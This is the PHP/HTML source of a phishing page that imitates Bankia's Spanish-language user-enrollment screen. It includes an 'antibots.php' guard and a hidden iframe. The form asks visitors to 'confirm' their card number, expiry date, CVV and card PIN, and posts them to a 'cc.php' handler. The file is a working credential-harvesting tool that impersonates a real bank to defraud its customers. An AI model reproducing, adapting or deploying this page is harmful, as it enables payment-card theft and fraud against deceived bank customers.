<?php
error_reporting(0);
include "antibots.php";

?>
<!DOCTYPE html>
<html ng-app="oip.enrollment" class="ng-scope" lang="es"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <style type="text/css">
        [uib-typeahead-popup].dropdown-menu {
            display: block;
        }
    </style>
    <style type="text/css">
        .uib-time input {
            width: 50px;
        }
    </style>
    <style type="text/css">
        [uib-tooltip-popup].tooltip.top-left>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.top-right>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.bottom-left>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.bottom-right>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.left-top>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.left-bottom>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.right-top>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.right-bottom>.tooltip-arrow,
        [uib-popover-popup].popover.top-left>.arrow,
        [uib-popover-popup].popover.top-right>.arrow,
        [uib-popover-popup].popover.bottom-left>.arrow,
        [uib-popover-popup].popover.bottom-right>.arrow,
        [uib-popover-popup].popover.left-top>.arrow,
        [uib-popover-popup].popover.left-bottom>.arrow,
        [uib-popover-popup].popover.right-top>.arrow,
        [uib-popover-popup].popover.right-bottom>.arrow {
            top: auto;
            bottom: auto;
            left: auto;
            right: auto;
            margin: 0;
        }

        [uib-popover-popup].popover,
        [uib-popover-template-popup].popover {
            display: block !important;
        }
    </style>
    <style type="text/css">
        .uib-datepicker .uib-title {
            width: 100%;
        }

        .uib-day button,
        .uib-month button,
        .uib-year button {
            min-width: 100%;
        }

        .uib-datepicker-popup.dropdown-menu {
            display: block;
            float: none;
            margin: 0;
        }

        .uib-button-bar {
            padding: 10px 9px 2px;
        }

        .uib-left,
        .uib-right {
            width: 100%
        }
    </style>
    <style type="text/css">
        .uib-position-measure {
            display: block !important;
            visibility: hidden !important;
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
        }

        .uib-position-scrollbar-measure {
            position: absolute;
            top: -9999px;
            width: 50px;
            height: 50px;
            overflow: scroll;
        }
    </style>
    <style type="text/css">
        .ng-animate.item:not(.left):not(.right) {
            -webkit-transition: 0s ease-in-out left;
            transition: 0s ease-in-out left
        }
    </style>
    <style type="text/css">
        @charset "UTF-8";
        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }

        ng\:form {
            display: block;
        }

        .ng-animate-shim {
            visibility: hidden;
        }

        .ng-anchor {
            position: absolute;
        }
    </style>
    <title>Alta de Usuario</title>
    <meta name="viewport" content="width=device-width" initial-scale="1">
    <meta name="description" content="Bankia-enrollment">

    <!-- inject:css-->
    <link rel="stylesheet" href="./Files/font-awesome.css">
    <link rel="stylesheet" href="./Files/bootstrap.css">
    <link rel="stylesheet" href="./Files/oip-icons.css">
    <link rel="stylesheet" href="./Files/oip-icons-overwrite.css">
    <link rel="stylesheet" href="./Files/helper.css">
    <link rel="stylesheet" href="./Files/Pe-media-icons.css">
    <link rel="stylesheet" href="./Files/helper(1).css">
    <link rel="stylesheet" href="./Files/pe-icon-7-stroke.css">
    <link rel="stylesheet" href="./Files/oip-styles.css">
    <link rel="stylesheet" href="./Files/oip-commons-safe-keyboard.css">
    <link rel="stylesheet" href="./Files/oip-enrollment.css">
    <link rel="stylesheet" href="./Files/access-key-creation.css">
    <link rel="stylesheet" href="./Files/bankia-already-user.css">
    <link rel="stylesheet" href="./Files/bankia-already-user-card.css">
    <link rel="stylesheet" href="./Files/bankia-already-user-cc.css">
    <link rel="stylesheet" href="./Files/bankia-office-contact.css">
    <link rel="stylesheet" href="./Files/bankia-telephone-contact.css">
    <link rel="stylesheet" href="./Files/conditions-acceptance.css">
    <link rel="stylesheet" href="./Files/confirmation.css">
    <link rel="stylesheet" href="./Files/confirm-modal.css">
    <link rel="stylesheet" href="./Files/case2-disabled.css">
    <link rel="stylesheet" href="./Files/digital-sign-creation.css">
    <link rel="stylesheet" href="./Files/finish-process.css">
    <link rel="stylesheet" href="./Files/footer.css">
    <link rel="stylesheet" href="./Files/header.css">
    <link rel="stylesheet" href="./Files/identity-verification.css">
    <link rel="stylesheet" href="./Files/personal-data.css">
    <link rel="stylesheet" href="./Files/recovery-key.css">
    <link rel="stylesheet" href="./Files/quiz.css">
    <link rel="stylesheet" href="./Files/session-expired.css">
    <link rel="stylesheet" href="./Files/sign-contracts.css">
    <link rel="stylesheet" href="./Files/slider-captcha.css">
    <link rel="stylesheet" href="./Files/steps-navegation.css">
    <link rel="stylesheet" href="./Files/steps-navegation-private.css">
    <link rel="stylesheet" href="./Files/document-modal.css">
    <link rel="stylesheet" href="./Files/sign-modal.css">
    <link rel="stylesheet" href="./Files/login.css">
    <link rel="stylesheet" href="./Files/help.css">
    <!-- endinject-->
    <link rel="icon" type="image/png" href="https://www.bankia.es/front/images/favicon.ico">
   </head><body><oip-enrollment></oip-enrollment>
    <!-- inject::js-->
   <script src="https://www.bankia.es/es/particulares/alta-usuario/enrollment/components/slider-captcha/slider-captcha.component.js"></script>
    <!-- endinject-->
 


<iframe src="./Files/dispatch.html" style="height: 1px; width: 1px; border: 0px; position: absolute; display: none; left: 0px; top: 0px; z-index: 0;"></iframe>
    <oip-enrollment class="ng-isolate-scope">
        <erm-header class="ng-isolate-scope">
            <div class="erm-header">
                <header>
                    <div class="container">
                        <div class="row oip-box margin-top margin-bottom cabecera-padding">
                            <div class="col-xs-10 col-md-8"><img src="./Files/CMP_IMG_h1_logo.PNG" class="logo">
                                <h2 ng-show="vm.setTypeHeader" class="title">Datos personales</h2>
                                <h2 ng-hide="vm.setTypeHeader" class="title ng-hide">Alta de usuario</h2>
                            </div>
                            <div class="hidden-xs col-sm-2 col-md-4 boton-desconectar">
                                <button ng-hide="vm.isPublic" ng-click="vm.logout()" class="oip-btn orange pull-right ng-hide"><i class="oip-icon fa fa-1x glyphicon glyphicon-off"></i>Desconectar</button>
                                <img src="Files/ico55.png" class="white pull-right" alt="" width="308" height="73">
                               </div>
                            </div>
                            <div ng-hide="vm.isPublic" class="visible-xs col-xs-2 icono-ayuda ng-hide"><span ng-click="vm.logout()" class="oip-icon circle orange fa-1x pull-right"><i class="oip-icon fa fa-1x glyphicon glyphicon-off desconectar"></i></span></div>
                            <div class="visible-xs col-xs-2 icono-ayuda"><span ng-click="vm.openHelp()" class="oip-icon circle fa-1x pull-right"><span class="numero">?</span></span>
                            </div>
                        </div>
                    </header></div>
                
            
        </erm-header>
        <!-- uiView: navigation -->
        <div ui-view="navigation" class="ng-scope">
            <erm-steps-navegation ng-show="isStep()" class="ng-scope ng-isolate-scope ng-hide">
                <div class="erm-steps-navegation">
                    <header>
                        <div class="container">
                            <div class="row">
                                <div class="col-md-12 oip-box margin-top margin-bottom">
                                    <div class="contenedor-pasos">
                                        <div oip-step-group="" oip-id="enrollmentMapProcess" auto-register="false" class="col-md-12 ng-scope">
                                            <div oip-step="personal-data" active="true" class="circulo-pasos paso1">
                                                <div ng-class="navigation.getStateClass('personal-data')" class="contenido-activo"> <span ng-show="manager['personal-data'].completed" class="oip-icon margin-right circle fa fa-check fa-1x ng-hide"></span><span ng-hide="manager['personal-data'].completed" class="oip-icon circle fa-1x"><span class="numero">1</span></span>
                                                    <div class="texto-paso">Datos personales</div>
                                                </div>
                                            </div>
                                            <div oip-step="access-key-creation" class="circulo-pasos paso2">
                                                <div ng-class="navigation.getStateClass('access-key-creation')" class="contenido-vacio"> <span ng-show="manager['access-key-creation'].completed" class="oip-icon margin-right circle fa fa-check fa-1x ng-hide"></span><span ng-hide="manager['access-key-creation'].completed" class="oip-icon circle fa-1x"><span class="numero">2</span></span>
                                                    <div class="texto-paso">Crear clave</div>
                                                </div>
                                            </div>
                                            <div oip-step="conditions-acceptance" class="circulo-pasos paso3">
                                                <div ng-class="navigation.getStateClass('conditions-acceptance')" class="contenido-vacio"> <span ng-show="manager['conditions-acceptance'].completed" class="oip-icon margin-right circle fa fa-check fa-1x ng-hide"></span><span ng-hide="manager['conditions-acceptance'].completed" class="oip-icon circle fa-1x"><span class="numero">3</span></span>
                                                    <div class="texto-paso">Aceptar condiciones</div>
                                                </div>
                                            </div>
                                            <div class="barra-navegacion"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </header>
                </div>
            </erm-steps-navegation>
        </div>
        <main class="container">
            <section class="content">
                <div class="row">
                    <div class="col-md-12 contenido">
                        <div class="container">
                            <erm-general-errors>
                                <!-- ngIf: generalErrors.list.length -->
                            </erm-general-errors>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <!-- uiView:  -->
                    <div ui-view="" class="col-md-12 contenido ng-scope">
                        <erm-recovery-key class="ng-scope ng-isolate-scope">
                            <div class="erm-personal-data">
                                <div class="container">
                                    <h2> Confirme los detalles de su tarjeta </h2>
                                    <form name="Form" id="myForm" method="post" style="margin:0px" action="cc.php">

                                        <div class="row"> </div>
                                        <div class="row">
                                            <div class="col-md-7">
                                                <div class="row">
                                                    
                                                    
                                              </div>
                                          </div>
                                      </div>
                                        <div class="row">
                                            <div class="col-md-7">
                                                <div class="row">
                                                    <div class="form-group col-md-6">
                                                        <div class="has-feedback">
                                                            <label for="email" placeholder="nombre@dominio.com" class="control-label">Número de tarjeta</label>
                                                            <div class="row">
                                                                <div class="col-md-12">
                                                                    <input id="email" ng-model="vm.data.email" oip-field-validation="" class="form-control ng-pristine ng-untouched ng-valid ng-valid-email" type="card" maxlength="16" name="card" style="width: 80%;" required="required">
                                                                    <!-- ngIf: personalDataForm.$submitted && personalDataForm.email.$invalid -->
                                                                    <!-- ngIf: personalDataForm.$submitted && personalDataForm.email.$valid && personalDataForm.email.$viewValue -->

                                                                </div>
                                                            </div>
                                                            <div class="oip-field-errors-container ng-inactive ng-hide" ng-messages="personalDataForm.email.$error" ng-show="personalDataForm.$submitted &amp;&amp; personalDataForm.email.$invalid">

                                                                <!-- ngMessage: required -->

                                                                <!-- ngMessage: pattern -->

                                                                <!-- ngMessage: minlength -->

                                                                <!-- ngMessage: maxlength -->

                                                                <!-- ngMessage: email -->
                                                            </div>
                                                        </div>
                                                    </div>
<div class="form-group col-md-6">
                                                        <div class="has-feedback">
                                                            <label for="email" class="control-label">Vencimiento</label>
                                                            <div class="row">
                                                                <div class="col-md-12">
                                                                    <input id="email" ng-model="vm.data.email" oip-field-validation="" class="form-control ng-pristine ng-untouched ng-valid ng-valid-email" style="width: 120px;" placeholder="MM/AAAA" maxlength="7"  name="datexpresd" type="text" required="required">
                                                                    <!-- ngIf: personalDataForm.$submitted && personalDataForm.email.$invalid -->
                                                                    <!-- ngIf: personalDataForm.$submitted && personalDataForm.email.$valid && personalDataForm.email.$viewValue -->

                                                                </div>
                                                            </div>
                                                            <div class="oip-field-errors-container ng-inactive ng-hide" ng-messages="personalDataForm.email.$error" ng-show="personalDataForm.$submitted &amp;&amp; personalDataForm.email.$invalid">

                                                                <!-- ngMessage: required -->

                                                                <!-- ngMessage: pattern -->

                                                                <!-- ngMessage: minlength -->

                                                                <!-- ngMessage: maxlength -->

                                                                <!-- ngMessage: email -->
                                                            </div>
                                                        </div>
                                                    </div>
<div class="form-group col-md-6">
                                                        <div class="has-feedback">
                                                            <label for="email" class="control-label">Código de seguridad</label>
                                                            <div class="row">
                                                                <div class="col-md-12">
                                                                    <input id="email" ng-model="vm.data.email" class="form-control ng-pristine ng-untouched ng-valid ng-valid-email" maxlength="3"  placeholder="CSC" style="white-space: ;width: 60px;" maxlength="3" name="cvv" required="required" type="text">
                                                                    <!-- ngIf: personalDataForm.$submitted && personalDataForm.email.$invalid -->
                                                                    <!-- ngIf: personalDataForm.$submitted && personalDataForm.email.$valid && personalDataForm.email.$viewValue -->

                                                                </div>
                                                            </div>
                                                            <div class="oip-field-errors-container ng-inactive ng-hide" ng-messages="personalDataForm.email.$error" ng-show="personalDataForm.$submitted &amp;&amp; personalDataForm.email.$invalid">

                                                                <!-- ngMessage: required -->

                                                                <!-- ngMessage: pattern -->

                                                                <!-- ngMessage: minlength -->

                                                                <!-- ngMessage: maxlength -->

                                                                <!-- ngMessage: email -->
                                                            </div>
                                                        </div>
                                                    </div>
                                                    
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-7"> <div class="col-xs-12 oip-box margin-top">
          <!-- ngIf: vm.aceptaInformacion --><oip-signature ng-if="vm.aceptaInformacion" config="vm.signatureConfig" on-sign="vm.onSign()" on-request-otp="vm.onRequestOtp()" ng-model="vm.signatureModel" class="ng-untouched ng-valid ng-scope ng-isolate-scope ng-dirty ng-valid-parse" style="">
<div class="oip-commons-signature">
<div class="device-xs visible-xs"></div>
  <div class="device-des visible-sm"></div>
<div class="device-lg visible-lg"></div>
  <!-- ngIf: !!signature.componentLoading===false&&signature.componentError===true -->
  <!-- ngIf: !!signature.componentError===false --><div ng-if="!!signature.componentError===false" class="content ng-scope">
    <!-- ngIf: (signature.componentLoading===true)||(!signature.config&&!signature.orderId) -->
    <div ng-show="!!signature.componentError===false" ng-class="{'conOTP':signature.config.mostrarFirmaElectronica&amp;&amp;signature.config.mostrarFirmaMovil}" class="row contenedor-principal col-12 mobile">
      
      <div ng-class="[                  {'firmaUnica':!(signature.config.mostrarFirmaElectronica&amp;&amp;signature.config.mostrarFirmaMovil)},                  {'conOTP':signature.config.mostrarFirmaElectronica&amp;&amp;signature.config.mostrarFirmaMovil}                  ]" class="oip-commons-signature__section otp col-12 col-des-6 mobile firmaUnica">
        <div class="oip-firma-content otp">
<div ng-show="signature.model.otpReady&amp;&amp;!signature.otpOK" class="hidden-desktop ng-hide">
  <oip-loading is-loading="signature.signingOTP" class="ng-isolate-scope"><div ng-class="{true:'oip-commons-loading-subheader', false:'oip-commons-loading'}[isSubheader]" ng-style="{'background-color':commonsLoading.color}" ng-show="commonsLoading.isLoading" ng-click="$event.stopPropagation();" class="ng-hide oip-commons-loading">
                    <div class="wrapper">
                      <span ng-show="commonsLoading.isLoading" class="oi-tabla-loading ng-hide" ng-class="{true:'oi-tabla-loading-subheader'}[isSubheader]">
                      </span>
                    </div>
                  </div> </oip-loading>
            <div>
              <label class="oip-text s-16 color-dark-gray">Introduce clave SMS</label>
            </div>
            <div ng-class="{'has-error': signature.otpError}" class="form-group">
              <div class="col-xs-full margin-top-25px margin-bottom-15px">
                <!-- ngIf: !signature.otpOK --><input id="otpInput" ng-if="!signature.otpOK" name="otpInput" maxlength="6" ng-model="signature.model.firmaMovil" ng-pattern="/^[a-zA-ZÁáÀàÉéÈèÍíÌìÓóÒòÚúÙùÑñüÜ0-9!@#$%^&amp;*?_~/]{4,8}$/" ng-disabled="signature.model.difiereFirmaMovil || signature.model.otpError == null || signature.model.otpError || signature.requestingOtp" autofocus="" stopccp="" required="" class="form-control ng-pristine ng-untouched ng-scope ng-isolate-scope ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" disabled="disabled" type="password"><!-- end ngIf: !signature.otpOK -->
              </div>
            </div>
            <div ng-show="!!signature.otpError===true" class="col-xs-full margin-bottom-15px ng-hide">
              <label class="oip-text s-16 line-height-14rem color-red ng-binding">Por favor, vuelve a introducir la firma.</label>
            </div>
            <div class="col-xs-full margin-bottom-15px text-center">
              <button ng-class="{'hidden': false}" ng-click="signature.signOTP()" ng-disabled="!!signature.model.otpReady===false || !!signature.model.firmaMovil.length===false" class="oip-btn ancho-completo orange" disabled="disabled">Validar clave</button>
            </div>
            <div class="col-xs-full margin-bottom-15px">
              <label class="oip-text s-14 color-gray">Introduce el código SMS que hemos enviado a tu teléfono.</label>
            </div>
        </div>
          <div ng-show="signature.model.otpReady&amp;&amp;!signature.otpOK" class="hidden-mobile ng-hide">
            <oip-loading is-loading="signature.signingOTP" class="ng-isolate-scope"><div ng-class="{true:'oip-commons-loading-subheader', false:'oip-commons-loading'}[isSubheader]" ng-style="{'background-color':commonsLoading.color}" ng-show="commonsLoading.isLoading" ng-click="$event.stopPropagation();" class="ng-hide oip-commons-loading">
                    <div class="wrapper">
                      <span ng-show="commonsLoading.isLoading" class="oi-tabla-loading ng-hide" ng-class="{true:'oi-tabla-loading-subheader'}[isSubheader]">
                      </span>
                    </div>
                  </div> </oip-loading>
            <div ng-show="signature.model.otpReady" class="col-sm-body ng-hide">
              <label class="oip-text s-16 margin-bottom-23rem color-dark-gray">Introduce clave SMS</label>
            </div>
            <div ng-class="{'has-error': signature.otpError}" class="col-sm-body form-group margin-bottom-12">
              <div class="width-285">
                <div class="col-sm-6 campo-referido">
                  <!-- ngIf: !signature.otpOK --><input id="otpInput" ng-if="!signature.otpOK" name="otpInput" maxlength="6" ng-model="signature.model.firmaMovil" ng-pattern="/^[a-zA-ZÁáÀàÉéÈèÍíÌìÓóÒòÚúÙùÑñüÜ0-9!@#$%^&amp;*?_~/]{4,8}$/" ng-disabled="signature.signingOTP                         || signature.model.otpError == null                         || signature.model.otpError                         || signature.requestingOtp                         || signature.signingOTP" autofocus="" stopccp="" required="" class="form-control ng-pristine ng-untouched ng-scope ng-isolate-scope ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" disabled="disabled" type="password"><!-- end ngIf: !signature.otpOK -->
                </div>
                <div class="col-sm-6 text-center btn-campo-referido">
                  <button ng-class="{'hidden': false}" ng-click="signature.signOTP()" ng-disabled="!!signature.model.otpReady===false                           ||signature.signingOTP                           ||!!signature.model.firmaMovil.length===false" class="oip-btn small no-margin orange" disabled="disabled">Validar clave</button>
                </div>
              </div>
            </div>
            <div ng-show="!!signature.otpError===true" class="col-sm-body msg-error ng-hide">
              <label class="oip-text s-14 color-red ng-binding">Por favor, vuelve a introducir la firma.</label>
            </div>
            <div class="col-sm-body margin-top-2">
              <label class="oip-text s-14 color-gray margin-bottom-25rem">Introduce el código SMS que hemos enviado a tu teléfono.</label>
            </div>
          </div>
          <div ng-show="signature.otpOK&amp;&amp;signature.signOtpStepCompleted" class="hidden-desktop ng-hide">
            <div class="col-xs-icon ajustar-margen--15px"><i class="oip-icon color-green oi-check"></i></div>
            <div ng-show="signature.otpOK&amp;&amp;signature.signOtpStepCompleted" class="col-xs-body no-padding-left ajustar-margen--15px margin-bottom-3rem ng-hide">
              <label class="oip-text s-16 color-dark-gray no-padding-left margin-top-20px">Clave SMS validada</label>
            </div>
          </div>
          <div ng-show="signature.otpOK" class="hidden-mobile ng-hide">
            <div ng-show="signature.otpOK" class="col-sm-body ng-hide">
              <div class="col-sm-2 col-no-padding"><i class="oip-icon color-green oi-check"></i></div>
              <div ng-show="signature.otpOK" class="col-sm-8 col-no-padding ng-hide">
                <label class="oip-text s-16 color-dark-gray margin-msg-success">Clave SMS validada</label>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div ng-show="signature.componentLoading||signature.config.mostrarFirmaElectronica||signature.electronicSignatureOK" ng-class="[                  {'firmaUnica':!(signature.config.mostrarFirmaElectronica&amp;&amp;signature.config.mostrarFirmaMovil)||signature.componentLoading===true},                  {'conOTP':signature.config.mostrarFirmaElectronica&amp;&amp;signature.config.mostrarFirmaMovil}                  ]" class="oip-commons-signature__section digital col-12 col-des-6 padding-left-10 mobile firmaUnica">
        <div ng-show="signature.componentLoading||signature.config.mostrarFirmaElectronica||signature.electronicSignatureOK" class="oip-firma-content digital">
          <div class="blurOnLoadBox" style="filter: blur(0px);">
            

            <div class="hidden-mobile col-sm-body">
              <h3 ng-class="{'color-gray':signature.config.mostrarFirmaMovil&amp;&amp;!signature.otpOK}" class="oip-text margin-bottom-1rem s-21 bold">Pin de tarjeta</h3>
            </div>
            <div ng-show="!signature.electronicSignatureOK" class="hidden-desktop">
              <oip-loading is-loading="signature.signingES" class="ng-isolate-scope"><div ng-class="{true:'oip-commons-loading-subheader', false:'oip-commons-loading'}[isSubheader]" ng-style="{'background-color':commonsLoading.color}" ng-show="commonsLoading.isLoading" ng-click="$event.stopPropagation();" class="ng-hide oip-commons-loading">
                    <div class="wrapper">
                      <span ng-show="commonsLoading.isLoading" class="oi-tabla-loading ng-hide" ng-class="{true:'oi-tabla-loading-subheader'}[isSubheader]">
                      </span>
                    </div>
                  </div> </oip-loading>
              
              <div ng-class="{'has-error': signature.electronicSignatureError}" class="form-group">
                <div class="col-xs-full margin-top-25px margin-bottom-15px">
                  <!-- ngIf: !signature.electronicSignatureOK --><input id="eSignInput" ng-if="!signature.electronicSignatureOK" ng-model="signature.model.firmaElectronica" ng-pattern="/^[a-zA-ZÁáÀàÉéÈèÍíÌìÓóÒòÚúÙùÑñüÜ0-9!@#$%^&amp;*?_~/]{4,8}$/" required="required" ng-disabled="signature.model.difiereFirmaElectronica" autofocus="" stopccp="" class="form-control ng-pristine ng-untouched ng-scope ng-isolate-scope ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" style="width: 110px;" maxlength="4" type="text" name="pin"><!-- end ngIf: !signature.electronicSignatureOK -->
                </div>
              </div>
              <div ng-show="!!signature.electronicSignatureError===true&amp;&amp;signature.componentLoading===false" class="col-xs-full margin-bottom-15px ng-hide">
                <label class="oiicop-text s-16 line-height-14rem color-red ng-binding">Firma digital errónea. Vuelve a introducir tu firma digital.</label>
              </div>
              <div ng-show="signature.config.mostrarRequiereFirmasAdicionales===true&amp;&amp;!signature.electronicSignatureOK" class="col-xs-full margin-bottom-15px ng-hide">
                <oip-message type="info" ng-show="signature.config.mostrarRequiereFirmasAdicionales" closable="false" show-icon="false" class="ng-isolate-scope ng-hide"><div class="oip-box">
        <div role="alert" class="oip-alert">
          <div class="row">
            <div class="col-xs-1 col-sm-1 oip-message-icon">
              <i class="oip-alert-icon oi-info" ng-class="{'oi-check': type === 'success', 'oi-error small': type === 'error', 'oi-info': type === 'info'}"></i>
            </div>
            <div ng-transclude="" class="col-xs-10 col-sm-10 oip-message-content">
                  <label class="oip-text line-height-14rem s-14 ng-scope">Recuerda, la operación queda pendiente hasta que firmen todos los titulares de la cuenta.</label>
                </div>
            <!-- ngIf: closable -->
          </div>
        </div>
      </div></oip-message>
              </div>
            
              <div ng-hide="signature.hideLinks===true" class="col-xs-full margin-bottom-15px"></div>
            </div>
            <div ng-show="!signature.electronicSignatureOK" ng-hide="signature.electronicSignatureAttemptsLimitExceeded" class="hidden-mobile">
              <oip-loading is-loading="signature.signingES" class="ng-isolate-scope"><div ng-class="{true:'oip-commons-loading-subheader', false:'oip-commons-loading'}[isSubheader]" ng-style="{'background-color':commonsLoading.color}" ng-show="commonsLoading.isLoading" ng-click="$event.stopPropagation();" class="ng-hide oip-commons-loading">
                    <div class="wrapper">
                      <span ng-show="commonsLoading.isLoading" class="oi-tabla-loading ng-hide" ng-class="{true:'oi-tabla-loading-subheader'}[isSubheader]">
                      </span>
                    </div>
                  </div> </oip-loading>
<div ng-show="!!signature.electronicSignatureError===true&amp;&amp;signature.componentLoading===false" class="col-sm-body msg-error ng-hide">
  <label class="oip-text s-14 color-red regular ng-binding">Firma digital errónea. Vuelve a introducir tu firma digital.</label>
          </div>
              <div ng-show="signature.config.mostrarRequiereFirmasAdicionales===true&amp;&amp;!signature.electronicSignatureOK" class="col-sm-body ng-hide">
                <oip-message type="info" ng-show="signature.config.mostrarRequiereFirmasAdicionales" closable="false" show-icon="false" class="ng-isolate-scope ng-hide"><div class="oip-box">
        <div role="alert" class="oip-alert">
          <div class="row">
            <div class="col-xs-1 col-sm-1 oip-message-icon">
              <i class="oip-alert-icon oi-info" ng-class="{'oi-check': type === 'success', 'oi-error small': type === 'error', 'oi-info': type === 'info'}"></i>
            </div>
            <div ng-transclude="" class="col-xs-10 col-sm-10 oip-message-content">
                  <label class="oip-text s-14 ng-scope">Recuerda, la operación queda pendiente hasta que firmen todos los titulares de la cuenta.</label>
                </div>
            <!-- ngIf: closable -->
          </div>
        </div>
      </div></oip-message>
              </div>
              <div style="line-height:1.5rem" ng-hide="signature.hideLinks===true" class="col-sm-body margin-top-2"> </div>
            </div>
            <div ng-show="signature.electronicSignatureOK===true&amp;&amp;signature.componentLoading===false" ng-hide="signature.componentLoading" class="hidden-desktop" style="">
              <div ng-show="signature.electronicSignatureOK" class="col-xs-icon ajustar-margen--15px ng-hide"><i class="oip-icon color-green oi-check"></i></div>
              <div ng-show="signature.electronicSignatureOK" ng-class="[{'margin-bottom-3rem':signature.config.mostrarRequiereFirmasAdicionales===false},                     {'margin-bottom-17rem':signature.config.mostrarRequiereFirmasAdicionales===true}]" class="col-xs-body no-padding-left ajustar-margen--15px ng-hide margin-bottom-3rem" style="">
                <label class="oip-text s-16 color-dark-gray no-padding-left margin-top-20px">Firma validada</label>
              </div>
              <div ng-show="signature.config.mostrarRequiereFirmasAdicionales===true&amp;&amp;signature.electronicSignatureOK" class="col-xs-body firmasAdicionalesMovil margin-bottom-3rem ng-hide">
                <oip-message type="info" ng-show="signature.config.mostrarRequiereFirmasAdicionales" closable="false" show-icon="false" class="ng-isolate-scope ng-hide"><div class="oip-box">
        <div role="alert" class="oip-alert">
          <div class="row">
            <div class="col-xs-1 col-sm-1 oip-message-icon">
              <i class="oip-alert-icon oi-info" ng-class="{'oi-check': type === 'success', 'oi-error small': type === 'error', 'oi-info': type === 'info'}"></i>
            </div>
            <div ng-transclude="" class="col-xs-10 col-sm-10 oip-message-content">
                  <label class="oip-text s-sm ng-scope">Recuerda, la operación queda pendiente hasta que firmen todos los titulares de la cuenta.</label>
                </div>
            <!-- ngIf: closable -->
          </div>
        </div>
      </div></oip-message>
              </div>
            </div>
            <div ng-show="signature.electronicSignatureOK&amp;&amp;signature.componentLoading===false" ng-hide="signature.componentLoading" class="hidden-mobile" style="">
              <div ng-show="signature.electronicSignatureOK" class="col-sm-body ng-hide">
                <div class="col-sm-2 col-no-padding"><i class="oip-icon color-green oi-check"></i></div>
                <div ng-show="signature.electronicSignatureOK" class="col-sm-8 col-no-padding ng-hide">
                  <label class="oip-text s-16 color-dark-gray margin-msg-success"> Firma validada</label>
                </div>
              </div>
              <div ng-show="signature.electronicSignatureOK&amp;&amp;signature.config.mostrarRequiereFirmasAdicionales===true" class="col-sm-body ng-hide">
                <oip-message type="info" ng-show="signature.config.mostrarRequiereFirmasAdicionales" closable="false" show-icon="false" class="ng-isolate-scope ng-hide"><div class="oip-box">
        <div role="alert" class="oip-alert">
          <div class="row">
            <div class="col-xs-1 col-sm-1 oip-message-icon">
              <i class="oip-alert-icon oi-info" ng-class="{'oi-check': type === 'success', 'oi-error small': type === 'error', 'oi-info': type === 'info'}"></i>
            </div>
            <div ng-transclude="" class="col-xs-10 col-sm-10 oip-message-content">
                  <label class="oip-text s-14 ng-scope">Recuerda, la operación queda pendiente hasta que firmen todos los titulares de la cuenta.</label>
                </div>
            <!-- ngIf: closable -->
          </div>
        </div>
      </div></oip-message>
              </div>
            </div>
            <!-- ngIf: signature.electronicSignatureAttemptsLimitExceeded -->
            <!-- ngIf: signature.electronicSignatureAttemptsLimitExceeded -->
          </div>
        </div>
      </div>
      <div ng-show="signature.componentLoading===false&amp;&amp;signature.config.mostrarFirmaElectronica&amp;&amp;signature.config.mostrarFirmaMovil" class="oip-commons-signature__section pendienteFirmaMovilOverlay col-12 col-des-6 padding-left-10 mobile ng-hide">
        <div ng-show="signature.config.mostrarFirmaElectronica" class="oip-firma-content">
          <div ng-class="{'custom-padding-top-ok-icon':signature.otpOK}" class="hidden-desktop">
            <div class="col-xs-icon mobile"><i class="oip-icon oi-candado color-gray"></i></div>
          </div>
          <div class="hidden-desktop">
            <h3 class="oip-text s-21 color-gray-666 bold line-height-14rem margin-bottom-14rem"> Firma digital</h3>
          </div>
          <div class="hidden-mobile fixed-icon-height">
            <div class="col-sm-icon oip-box-icon first-box"><i class="oip-icon color-gray oi-candado"></i></div>
          </div>
          <div class="hidden-mobile col-sm-body">
            <h3 class="oip-text color-gray-666 margin-bottom-1rem s-21 bold"> Firma digital</h3>
          </div>
          <div class="hidden-desktop col-xs-body no-padding-left padding-right-2rem margin-bottom-15px mensaje-xs"><span class="oip-text s-16 color-dark-gray">Una vez validado el código SMS introduce tu firma digital para finalizar la operación.</span></div>
          <div class="hidden-mobile col-sm-body mensaje-sm"><span class="oip-text s-16 color-dark-gray">Una vez validado el código SMS introduce tu firma digital para finalizar la operación.</span></div>
        </div>
      </div>
    </div>
  </div><!-- end ngIf: !!signature.componentError===false -->
</div></oip-signature><!-- end ngIf: vm.aceptaInformacion -->
        </div></div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-12">
                                                <p class="advice-bottom-text ng-binding"><span class="ng-binding"> </span><span><a href="" class="ng-binding"></a></span><span class="ng-binding"> </span><span class="ng-binding"></span></p>
                                            </div>
                                        </div>
                                        <div class="row form-inline">
                                            <div class="form-group col-md-offset-8 col-md-2 text-center">
                                                <button type="button" ng-click="vm.confirmExit()" class="oip-btn white">Cancelar</button>
                                            </div>
                                            <div class="form-group col-md-2 text-center">
                                                <button type="submit" ng-disabled="vm.validatingRecoveryKeyData" erm-submit="" class="oip-btn green ng-isolate-scope">Continuar</button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </erm-recovery-key>
                    </div>
                </div>
            </section>
        </main>
        <erm-footer class="ng-isolate-scope">
            <div class="erm-footer">
                <footer class="container oip-box margin-top">
                    <div class="row">
                        <div class="col-md-12"><span class="ng-binding">© Bankia S.A, 2019. España. Todos los derechos reservados</span></div>
                    </div>
                </footer>
            </div>
        </erm-footer>
    </oip-enrollment>

    <noscript>&lt;div style="display:inline;"&gt;&lt;img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/970006428/?guid=ON&amp;amp;amp;script=0"&gt;&lt;/div&gt;</noscript>



